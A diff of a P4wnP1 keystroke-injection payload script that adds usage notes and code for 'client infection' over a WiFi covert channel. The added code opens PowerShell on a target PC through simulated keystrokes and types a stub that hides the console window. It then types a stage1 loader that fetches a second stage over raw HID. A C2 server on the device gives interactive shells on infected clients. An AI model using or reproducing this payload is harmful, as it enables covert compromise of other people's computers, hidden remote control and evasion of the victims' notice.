@@ -1,6 +1,6 @@
 #    This file is part of P4wnP1.
 #
-#    Copyright (c) 2017, Marcus Mengs. 
+#    Copyright (c) 2018, Marcus Mengs. 
 #
 #    P4wnP1 is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -18,7 +18,41 @@
 
 
 # P4wnP1 WiFi covert channel !! EXPERIMENTAL !!
-# ==========================
+# =============================================
+#
+# For additional notes see comments in code ... no time to document, right now ... sorry!!
+# 
+#
+# Usage:
+#
+# 1) Client infection
+# - be sure to have the `lang` option in this payload set according to the clients keyboard layout (default us)
+# - attach P4wnP1 to clients, wait till LED blinks twice (target is ready to receive keyboard input)
+# - press NUMLOCK on target about 5-times (fast)
+# - P4wnP1 starts typing out the payload, if `HIDE_AGENT_WINDOW` is enabled, the console window gets hidden
+# - During typing the LED stops blinking, wait till the LED blinks again (P4wnP1 is still typing out the payload
+#   even if the window is hidden)
+# - When the LED blinks again, the client payload should be running and P4wnP1 could be removed
+# - THE CLIENT NEEDS A WIFI ENABLED INTERFACE FOR THE CHANNEL TO WORK. BUT, THERE'S NO NEED TO HAVE THE CLIENT CONNECTED
+#   TO ANY WIFI (that's what this is all about)
+#
+# 2) Bring up C2 Server
+# - Attach P4wnP1 to another host OR POWER SOURCE (there's no host needed, as C2 server is accessed via WiFi)
+# - P4wnP1 spawns a WiFi hotspot with name and password set according to the options in this payload
+# - connect to the network and login to P4wnP1 with user `pi` and your password
+# - on login the C2 serve is attached to the SSH session
+# 		- issue `sessions` to list currently connected clients
+#		- use `interact <SESSION NUMBER>` to spawn a shell (comms are slow on this channel, so be patient)
+#		- press [CTRL + C] during interaction to bring up a menu for the session
+#
+# Client agent code:	
+# C2 server code:
+#
+
+
+
+HIDE_AGENT_WINDOW=true # if true, a powershell stub gets added, which hides the target window during keystroke injection
+
 
 # overwrite keyboard language from setup.cfg
 lang="us" 
@@ -79,6 +113,8 @@ function onKeyboardUp()
 		# wait for keyboard LED trigger
 		key_trigger
 	
+		led_blink 0 # turn led of while typing
+	
 		# run interactive PowerShell console
 		cat <<- EOF | duckhid
 			GUI r
@@ -88,9 +124,17 @@ function onKeyboardUp()
 			DELAY 1000
 EOF
 
+		if $HIDE_AGENT_WINDOW; then
+			# output window hider stub (taken from P4wnP1 hid cover channel --> fast hiding with a short line, invisible window keeps input fokus)
+			# hint: echo instead of printf introduces a new_line_char, which gets interpreted as pressing return by `outhid` 
+			echo '$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)' | outhid
+		fi
+
 		# output stage1 command (loads stage2 via raw HID)
 		(printf "\$USB_VID='1D6B';\$USB_PID='4137';"; cat $wdir/hidtools/payload_delivery/stage1_mini.ps1) | outhid
 
+		led_blink 2 # turn led back on, to indicate typing finished
+		
 	done
 
 }
@@ -100,15 +144,14 @@ EOF
 # the commans are ran by user "pi"
 function onLogin()
 {
-	if [ -f /tmp/server_started ]; then
+	# check if server is running (if the server crashed it could be restarted with new ssh login)
+	if [ $(ps -aux | grep -v -e grep | grep wifi_server.py | wc -l) -gt 0 ]; then
 		echo "Attaching to WiFi covert channel server's screen session ..."
 	else
 		echo "Starting covert channel server"
 		sudo screen -dmS wifi_c2 bash -c "cd $wdir/nexmon; python wifi_server.py"
-		touch /tmp/server_started
 	fi
 
-	#sudo screen -d -r
 	# attach to covert channel control server
 	sudo screen -d -r wifi_c2
 	return
